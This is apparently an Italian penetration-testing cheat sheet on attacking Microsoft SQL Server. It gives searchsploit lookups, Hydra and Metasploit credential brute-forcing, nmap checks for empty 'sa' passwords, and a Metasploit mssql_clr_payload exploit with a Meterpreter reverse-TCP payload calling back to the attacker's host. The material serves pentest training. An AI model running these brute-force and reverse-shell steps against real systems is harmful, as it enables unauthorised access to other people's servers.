
## Ricerca Exploit noti
Dopo aver effettuata la scansione del servizio e la sua versione nella fase di Scansione ed Enumerazione, possiamo procedere con la ricerca di exploit noti usando <a href="https://www.exploit-db.com/">Ecploit Database</a> oppure: 
```bash
searchsploit <ftp-versione> 
```
> Se restituise un exploit utilizzabile, copia il path e usa `searchsploit -m <path>`

---

## Bruteforce
Se sono richieste delle credenziali di accesso, possiamo tentare di eseguire un bruteforce
### Hydra
```bash
hydra -L <userList> -P <passwordsList> mssql <ip>
```

### Metasploit
```bash
use auxiliary/scanner/mssql/mssql_login
set RHOST <IP>
set USER_FILE <userList>
set PASS_FILE <passwordList>
set CREATESESSIONS true
run
```
se dovesse trovare delle credenziali, eseguirá automaticamente l'accesso e potremmo collegarci con `sessions -i <numeroSessione>`

---

## Exploiting
### mssql_clr_payload 
Se il servizio MSSQL ha queste caratteristiche: 
- Porta 1433 aperta `nmap -p 1433 <IP>`
- MSSQL è in ascolto `nmap -sU -p 1434 --script ms-sql-info <IP>` restituendo nome e versione sql server che sia compresa tra 2000/2005/2008/2012
- Login deboli dopo `nmap -p 1433 --script ms-sql-empty-password <IP>` dando come output `sa:<empty> => Login Success`

allora possiamo procedere con l'exploit
```bash
use exploit/windows/mssql/mssql_clr_payload
set RHOST <ip>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <IP>
exploit
```
cosí da ottenere una sesisone meterpeter sul target. 
